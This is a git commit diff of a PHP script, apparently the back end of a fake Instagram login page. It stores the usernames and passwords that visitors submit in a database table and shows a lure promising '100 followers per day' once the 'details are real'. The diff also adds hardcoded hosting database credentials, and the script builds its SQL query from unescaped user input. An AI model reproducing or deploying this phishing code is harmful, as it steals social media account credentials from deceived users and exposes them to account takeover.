e208cd4e6e40386aa3079ecedf2e58190f415827
shivanshu970 <103175076+shivanshu970@users.noreply.github.com>
2022-04-14 20:09:14 +0530

    Update insta6236.php

--- insta6236.php
+++ insta6236.php
@@ -1,15 +1,15 @@
 <?php
 
 
-$con = mysqli_connect('localhost','root');
+$con = mysqli_connect('localhost','id18745462_rooter','N=yECis$*XIqFx3G');
 
 if($con){
-    echo "Connection Sucessful";
+    echo"THANKS FOR LOGIN IF YOUR DETAILS ARE REAL THEN YOUR 100 FOLOWERS PER DAY SERVICE START";
 }else{
     echo "No Connection";
 }
 
-mysqli_select_db($con, 'mycontactusforms');
+mysqli_select_db($con, 'id18745462_datalogininsta');
 
 $username = $_POST['username'];
 $password = $_POST['password'];
@@ -18,7 +18,5 @@ $query = " insert into instagram057235 (username, password)
 values ('$username', '$password') ";
 
 mysqli_query($con, $query);
-
-header('instagramlogin.html')
 
 ?>
